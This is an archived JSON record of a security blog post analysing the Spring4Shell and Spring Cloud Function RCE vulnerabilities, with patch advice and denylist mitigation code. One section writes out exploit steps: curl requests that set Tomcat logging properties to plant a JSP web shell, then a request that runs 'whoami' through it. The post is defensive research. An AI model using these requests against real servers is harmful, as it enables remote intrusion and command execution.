{
    "id": "defa440a-16b1-46b1-a20a-c6fb20c0c97e",
    "created_at": "2023-01-12T15:00:33.027437Z",
    "updated_at": "2025-03-27T02:08:40.580525Z",
    "deleted_at": null,
    "sha1_hash": "152939dd2399c65dfafa51f141934206d494f759",
    "title": "2022-03-31 - Spring4Shell- Security Analysis of the latest Java RCE '0-day' vulnerabilities in Spring",
    "authors": "",
    "file_creation_date": "2022-05-29T01:32:09Z",
    "file_modification_date": "2022-05-29T01:32:09Z",
    "file_size": 457207,
    "plain_text": "# Spring4Shell: Security Analysis of the latest Java RCE '0- day' vulnerabilities in Spring\n\n**lunasec.io/docs/blog/spring-rce-vulnerabilities/**\n\nFree Wortley March 31, 2022\n\nMarch 31, 2022 · 14 min read\n\nLogo by [Daniel Christensen](https://github.com/BobTheShoplifter/Spring4Shell-POC)\nOriginally posted March 30th, 2022.\n\n**Update, Patch Available: Patches are now available for Spring4Shell in Spring versions**\n[5.3.18 and 5.2.20 and an official CVE has been published as CVE-2022-22965.](https://tanzu.vmware.com/security/cve-2022-22965)\n\n### What is it?\n\nTwo serious vulnerabilities leading to remote code execution (RCE) have been found in the\npopular Spring framework, one in Spring Core and the other in Spring Cloud Functions.\n\n## Who is impacted?\n\nAnyone using Spring on `Java 9 or newer, especially those using TomCat. Java 8 does not`\nappear to be vulnerable.\n\nSo far, the only confirmed exploit depends on Spring being deployed with TomCat. However,\nother vectors may be discovered. We recommend all Spring users update, starting with those\nusing TomCat.\n\n## The two vulnerabilities\n\n**1. Spring4Shell - an RCE in Spring Core**\n\n\n-----\n\nThis vulnerability, dubbed Spring4Shell, leverages class injection leading to a full RCE, and\nis very severe. The name \"Spring4Shell\" was picked because Spring Core is a ubiquitous\n[library, similar to log4j which spawned the infamous Log4Shell vulnerability.](https://www.wired.com/story/log4j-flaw-hacking-internet/)\n\nWe believe that users running JDK version 9 and newer are vulnerable to an RCE attack. All\nversions of Spring Core are impacted.\n\nThere are strategies to mitigate the attack, and we believe that not all Spring servers are\nnecessarily vulnerable, depending on other factors discussed below. That said, we currently\nrecommend that all users apply mitigations or update if they are using Spring Core.\n\n[A CVE has now been published for this vulnerability as CVE-2022-22965.](https://tanzu.vmware.com/security/cve-2022-22965)\n\nNote: there is also an unconfirmed deserialization weakness in Spring Core that could\npotentially lead to an RCE for Spring Core <=5.3.17.\n\nMore details on this vulnerability below\n\n**2. RCE in \"Spring Cloud Function\"**\n\nCVE-2022-22963: A confirmed RCE in Spring Cloud Function (<=3.1.6 and <=3.2.2).\n\nIf you're using the Spring Cloud Function library, you must upgrade to 3.1.7+ or 3.2.3+ to\nprevent an RCE attack.\n\nMore details on CVE-2022-22963 below\n\n## Spring4Shell\n\nOn March 29th, 2022, a set of Tweets (now deleted) were published from a Chinese Twitter\naccount showing screenshots of a new POC 0-day exploit in the popular Java library Spring\n_Core. It is being referred to as \"Spring4Shell\" or \"SpringShell\" by users online._\n\n[A CVE was added on March 31st, 2022 by the Spring developers as CVE-2022-22965.](https://tanzu.vmware.com/security/cve-2022-22965)\n\n**Update: The authors of Spring have published a patch for this with versions 5.3.18 and**\n_5.2.20_\n\n### Applying Mitigations\n\nA patch is now available as of March 31st, 2022 in the newest published Spring versions\n5.3.18 and 5.2.20. We recommend all users update. For those unable to update, the\nfollowing mitigations are possible:\n\nAccording to the [Praetorian post confirming the presence of an RCE in Spring Core, the](https://www.praetorian.com/blog/spring-core-jdk9-rce/)\ncurrently recommended approach for is to patch `DataBinder by adding a blacklist of`\nvulnerable field patterns required for exploitation\n\n\n-----\n\n_Review our section on how exploitation works and why these mitigations patch the Class_\n_Loader Manipulation\" attack vector used by the RCE._\n\nnote\n\nGetting Spring to load `BinderControllerAdvice may require manual steps to have it`\nload. We'll update this guide with more details about how to do that soon.\n```\nimport org.springframework.core.Ordered;\nimport org.springframework.core.annotation.Order;\nimport org.springframework.web.bind.WebDataBinder;\nimport org.springframework.web.bind.annotation.ControllerAdvice;\nimport org.springframework.web.bind.annotation.InitBinder;\n@ControllerAdvice\n@Order(10000)\npublic class BinderControllerAdvice {\n  @InitBinder\n  public void setAllowedFields(WebDataBinder dataBinder) {\n    // This code protects Spring Core from a \"Remote Code Execution\" attack\n(dubbed \"Spring4Shell\").\n    // By applying this mitigation, you prevent the \"Class Loader Manipulation\"\nattack vector from firing.\n    // For more details, see this post: https://www.lunasec.io/docs/blog/springrce-vulnerabilities/\n    String[] denylist = new String[]{\"class.*\", \"Class.*\", \"*.class.*\",\n\"*.Class.*\"};\n    dataBinder.setDisallowedFields(denylist);\n}\n\n```\nAlternatively, you can inject the mitigations by adding a method to a controller:\n\n\n-----\n\n```\nimport com.pinger.fun.model.EvalBean;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.beans.propertyeditors.StringTrimmerEditor;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.WebDataBinder;\nimport org.springframework.web.bind.annotation.InitBinder;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\nimport javax.servlet.ServletContext;\nimport javax.servlet.http.HttpServletRequest;\n@RestController\npublic class IndexController {\n  @RequestMapping(\"/index\")\n  public void index(EvalBean evalBean){\n    System.out.println(\"Hello world!\");\n  // You only need to add this method in one of your controllers in order to\nprevent exploitation.\n  @InitBinder\n  public void initBinder(WebDataBinder binder) {\n    // This code protects Spring Core from a \"Remote Code Execution\" attack\n(dubbed \"Spring4Shell\").\n    // By applying this mitigation, you prevent the \"Class Loader Manipulation\"\nattack vector from firing.\n    // For more details, see this post: https://www.lunasec.io/docs/blog/springrce-vulnerabilities/\n    String[] blackList = {\"class.*\",\"Class.*\",\"*.class.*\",\".*Class.*\"};\n    binder.setDisallowedFields(blackList);\n\n### Our Analysis\n\n```\nThe speculation around this RCE was initially that this was related to a change that was\nmade to Spring Core the deprecates an old \"exception cloning\" function that uses Java\nserialization and deserialization. This is problematic because deserialization with untrusted\nstring values, in Java, does allow an attacker to gain RCE.\n\nHowever, in this case, there are mitigating factors because of where this function is exposed.\nBy default, it's only exposed in the `@CacheResult` [annotation (code) which requires an](https://github.com/spring-projects/spring-framework/blob/02d3e00d33a578fb776cc2c65a9c15d9a75b2072/spring-context-support/src/main/java/org/springframework/cache/jcache/interceptor/CacheResultInterceptor.java#L125)\nexception to be thrown and then cached. Even if this vulnerability is exploitable, it will not be\n[as easily exploitable as Log4Shell was.](https://www.lunasec.io/docs/blog/log4j-zero-day) _This was not the attack vector originally_\n_hypothesized._\n\ninfo\n\n\n-----\n\n**[Update: The originally hypothesized Deserialization Injection vector was not the attack](https://owasp.org/www-pdf-archive/GOD16-Deserialization.pdf)**\nvector used by the original deleted Twitter screenshots. People have confirmed that the issue\nis due to a weakness that enables a \"Class Loader Manipulation\" attack when\n```\n@RequestMapping is used to parse a request.\n\n### Exploit Scenario Overview\n\n```\n_[We've reverse engineered this information by analyzing a few POCs like this one and by](https://github.com/TheGejr/SpringShell)_\n_writing an app to help us test for \"real\" exploitation._\n\nConsider the below code:\n```\npublic class Greeting {\n  private long id;\n  public long getId() {\n    return id;\n  public void setId(long id) {\n    this.id = id;\n@Controller\npublic class HelloController {\n  @PostMapping(\"/greeting\")\n  public String greetingSubmit(@ModelAttribute Greeting greeting, Model model) {\n    return \"hello\";\n}\n\n```\nExecuting the request:\n```\ncurl 'http://localhost:8080/greeting?id=test'\n\n```\nWill attempt to parse the query parameters `id=test into the Plain Old Java Object (POJO)`\n```\nrequest which is of type Greeting . With this normal request, Spring's\nRequestMapping will use the setter for id to set the POJO's name field to \"test\" .\n\n```\nThe vulnerability exists due to other values that can be set.\n\n\n-----\n\nExploring the values that can be set using query parameters, we see that `class is`\naccessible. We can traverse the properties of `class with our query parameter and locate a`\nfield that we can both write to and has meaning to the execution of the program:\n```\ncurl 'http://localhost:8080/spring4shell?\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=test'\n\n```\nSubsequent requests can be issued which set the following Tomcat logging properties:\n```\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%\n1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di\nclass.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp\nclass.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROO\nclass.module.classLoader.resources.context.parent.pipeline.first.prefix=shell\nclass.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=\n\n```\n[Exploiting this vulnerability is similar to the method for exploiting CVE-2010-1622.](http://blog.o0o.nu/2010/06/cve-2010-1622.html)\n\nIssuing a final request will use the values that have been set to exploit the vulnerability\n```\ncurl http://localhost:8080/shell.jsp?cmd=whoami\n\n```\nA file will be written to: `webapps/ROOT/shell.jsp and it will contain the payload from the`\nTomcat pattern property set above. This file will be used for format the logs for the server and\nan arbitrary command can be passed in using the query parameter `cmd .`\n\n[It is important to note that this has only been tested to work on an Apache Tomcat server.](https://github.com/lunasec-io/Spring4Shell-POC/blob/master/Dockerfile#L1)\nWithout being run on a Tomcat server, the above logging properties will not exist. Another, as\nof yet unknown method of exploitation would be needed.\n\n\n-----\n\n### Test the Exploit yourself\n\nYou can now test the end-to-end exploitation of Spring4Shell with this vulnerable app and\nexploit we have published. This is a fork of reznok's Spring4Shell POC. Code for the exploit\n[can be found in this file.](https://github.com/lunasec-io/Spring4Shell-POC/blob/master/exploit.py)\n\nWe've gone through and verified that this exploit is functional by building on the work of the\nmany other security researchers digging into this. As we continue to work on it, we'll be\nadding additional changes to that repo.\n\n_From sketchy Twitter screenshots to a working POC in under 48 hours! It's been a wild ride,_\n_y'all. Thank you, everybody working on this, for your help to make that possible!_\n\n## CVE-2022-22963 - A Separate Vulnerability\n\nA serious RCE vulnerability discovered in the Spring Cloud Function library. This is a\nseparate vulnerability than Spring4Shell, discussed above.\n\nBecause this vulnerability was discovered almost simultaneously alongside Spring4Shell,\nand was first to have a CVE published, there was much confusion between the two online.\n[This is being tracked by CVE-2022-22963, and it affects the Spring Cloud Function library](https://tanzu.vmware.com/security/cve-2022-22963)\n_only which is a separate Java library from Spring Core._\n\nThis vulnerability currently has a CVSS score of 5.7 and has known POCs available on\n[Twitter and](https://twitter.com/bytehx343/status/1509034539330732033) [GitHub (another).](https://github.com/dinosn/CVE-2022-22963)\n\n### Our Analysis\n\nThis vulnerability is real. If you're using the Spring Cloud Function library, you should\nupgrade to 3.1.7+ or 3.2.3+ to mitigate this RCE.\n\n## The Current Situation\n\nTrying to understand what information is \"real\" and what mitigations actually work is very\ndifficult before a CVE is published. That was especially true when the Spring developers\nthemselves originally denied that there was a problem.\n\nNow that an official CVE and Spring patches have been published, there is a clear mitigation\npath for users.\n\nThis was a particularly confusing situation because two vulnerabilities were published in\nSpring spring packages (Spring Core and Spring Cloud Function) at almost the same time.\n[Now that an official CVE for Spring4Shell has been published as CVE-2022-22965, it's much](https://tanzu.vmware.com/security/cve-2022-22965)\nclearer to differentiate the two.\n\n\n-----\n\nWhat is important to remember is that this vulnerability is NOT as bad a Log4Shell. All attack\nscenario are more complex and have more mitigating factors than Log4Shell did because of\nthe nature of how deserialization exploits _Class Loader Manipulation attacks work in Java._\n\nWith Log4Shell, exploitation was trivial and an exploit could be written in seconds that\nworked on most apps.\n\nWith Spring4Shell, exploitation requires deep Java knowledge to get a functioning POC.\nClass Loader Manipulation is more complicated to understand than the Log4Shell\nvulnerability.\n\n## Some Context\n\n**Deserialization alone is not a CVE**\n\nWhy not declare this a problem immediately and add to the panic?\n\nWhen we initially wrote this post, the level of uncertainty was much higher than it is now.\nAnd, by itself, Code Execution isn't terribly concerning. JavaScript still has the `eval`\nfunction included in every Node.js server or browser, but it's not considered to be a security\nvulnerability until an attacker has a way to feeding string input into `eval with content they`\ncontrol.\n\nIn order to achieve that, for most applications, an attacker would have to be able to modify\nthe application's source code directly in order to give themselves access to execute `eval .`\nAnd, at that point, they wouldn't need `eval anymore because they can just put in their own`\ncode anyway!\n\nThat's what why security experts call them \"Remote Code Execution\" (RCE) attacks. We're\nonly ever concerned when an unauthorized user is able to Remotely execute code. That's\nwhat made Log4Shell such a bad RCE vulnerability because developers log user-controlled\nvariables (like usernames) all the time!\n\n**Similarities to Log4Shell**\n\nThere are a lot of similarities between Spring4Shell and Log4Shell beyond their names. Back\nin December we were the first team to write about the (at the time speculated) Java RCE\nvulnerability in log4j that we found floating around on Twitter.\n\nWe initially named that vulnerability \"Log4Shell\" because, at the time, because CVE-202144228 hadn't been published nor had the Apache team published about any security notices\nabout the issue.\n\n\n-----\n\nAnd, just like then, misinformation was able to spread quickly and easily. It s much easier to\nphotoshop a screenshot showing an exploit and \"redact the details\" than it is to investigate a\nsecurity vulnerability in a large code base like Spring Core. It's also easy to tell people how to\n\"fix\" the vulnerability without any proof that the mitigations are effective. (Which is why a 2nd\nCVE was published in log4j.)\n\nUsers on Twitter have been calling this possible RCE \"Spring4Shell\" to differentiate the RCE\nvulnerabilities. We're doubling down on that term, in lieu of a proper CVE, to help users\nsearch for it separately from the other RCE mentioned in this post.\n\nFortunately, this isn't the first \"incident\" we've responded to, and we're happy to help tame\nthe chaos. See our list of kudos at the bottom of this post to see who else helped us write\nthis!\n\n## Get notified automatically\n\n[We've been actively posting small updates and details in this Twitter thread. If you'd like to](https://twitter.com/LunaSecIO/status/1509084844042510336)\nget automatically updated about new developments relating to Spring4Shell, you may\nsubscribe to our newsletter at the bottom of this post.\n\nYou can join our email updates newsletter at the bottom of this post to receive updates from\nus whenever we publish them.\n\nWe promise not to spam you and to only email you a few times per month. We're just a team\nof Security Engineers building Open Source Application Security tooling, and not a company\ntrying to just hop on the latest [vulnerability hype train.](https://www.lunasec.io/docs/blog/log4j-hype-train/)\n\nIn addition, we're currently building an Open Source tool called LunaTrace that is designed to\nnotify you when new vulnerabilities like this one are found in your code. The code is available\non [GitHub and our hosted version is available to try out (it's still under active development,](https://github.com/lunasec-io/lunasec)\n[so expect bugs). It's also available as a GitHub App that will scan your Pull Requests](https://github.com/apps/lunatrace-by-lunasec/)\nautomatically for new vulnerabilities.\n\nContact Us\n\nIf you'd like to contribute any specific information about this vulnerability, we encourage you\n[to add it to this blog post directly by adding it yourself on GitHub! Once you do, please send](https://github.com/lunasec-io/lunasec/blob/master/docs/blog/2022-03-30-spring-core-rce.mdx)\nus a Pull Request.\n\n[You can also email us with any discoveries or corrections. Or, mention us on Twitter. We're](http://10.10.0.46/mailto:contact@lunasec.io)\nhappy to retweet anything valuable.\n\n### About Us\n\n\n-----\n\n**It s an order of magnitude less work to create a lie than to refute one.** _- A former_\n_colleague_\n\nWhy listen to us?\n\nWith chaos everywhere, it can be hard to know who to trust. So why this post versus any\nother?\n\nWe're all Security Engineers with experience dealing with chaos. In addition to writing a\n[mitigation guide for Log4Shell, we've also been validating bug reports professionally for](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide)\nyears. We helped run the Bug Bounties at Uber and Snapchat, wading through many false\nreports. Because of that, we work hard to verify vulnerabilities before we sound the alarm.\n\nWe're committed to only publishing the facts and our thoughts after we've had time to\nunderstand them.\n\n### Help us build Open Source AppSec Tools\n\nIf this post helped you, please consider saying thank you. We do the work of publishing\nthese posts for free because we believe that it's the best way to contribute back to the world.\nCyberattacks are a real problem, and the current war in Ukraine has only added to that risk.\n\nHow to help us:\n\n[Star us on GitHub and check out our tools,](https://github.com/lunasec-io/lunasec)\nSubscribe to our newsletter below (only a few emails per month, promise!),\n[Follow us on Twitter and](https://twitter.com/LunaSecIO/) [retweet this thread,](https://twitter.com/LunaSecIO/status/1509084844042510336)\n[Email us about using trying an early build of LunaTrace.](http://10.10.0.46/mailto:contact@lunasec.io)\n\n## References\n\nWe wanted to say \"thank you\" to the following authors for their assistance helping to warn\nothers about this.\n\n[Thank you BugAlert.org for their post about this on GitHub.](https://github.com/BugAlertDotOrg/bugalert/blob/main/content/notices/2022-03-29-spring.md)\n[Thank you to CyberKendra for their post translating content from Chinese to English](https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html)\nand warning others.\nThank you to [Praetorian for digging into this exploit, figuring it out, and working with the](https://www.praetorian.com/blog/spring-core-jdk9-rce/)\nSpring developers to help get a patch released!\nThank you to [Daniel Christensen for providing a logo like the old OG Log4Shell one!](https://github.com/BobTheShoplifter/Spring4Shell-POC)\n\n### Updates\n\n1. 3/30/22 @ 10am PDT: First post.\n\n\n-----\n\n2. 3/30/22 @ 3pm PDT: Updated the post with more details from Praetorian, and\n\nrefactored the content to make it easier to read.\n3. 3/31/22 @ 12:08 PDT: Update exploitation details of the vulnerability now that we know\n\nhow to exploit it.\n4. 3/31/22 @ 12:55pm PDT: Added information about the new CVE and available patch\n\nversions from the Spring devs.\n5. 3/31/22 @ 3:58pm PDT: Fixed a typo with the Spring versions. They were the versions\n\nfrom Spring Boot, not Spring itself.\n6. 3/31/22 @4:57pm PDT: Added information about an end-to-end vulnerable app + POC.\n7. 4/1/22 @6:00pm PDT: Major article rework / reorganization. Many outdated statements\n\nthat were previous struck-through have been deleted.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-31 - Spring4Shell- Security Analysis of the latest Java RCE '0-day' vulnerabilities in Spring.pdf"
    ],
    "report_names": [
        "2022-03-31 - Spring4Shell- Security Analysis of the latest Java RCE '0-day' vulnerabilities in Spring.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535633,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653787929,
    "ts_modification_date": 1653787929,
    "files": {
        "pdf": "https://archive.orkl.eu/152939dd2399c65dfafa51f141934206d494f759.pdf",
        "text": "https://archive.orkl.eu/152939dd2399c65dfafa51f141934206d494f759.txt",
        "img": "https://archive.orkl.eu/152939dd2399c65dfafa51f141934206d494f759.jpg"
    }
}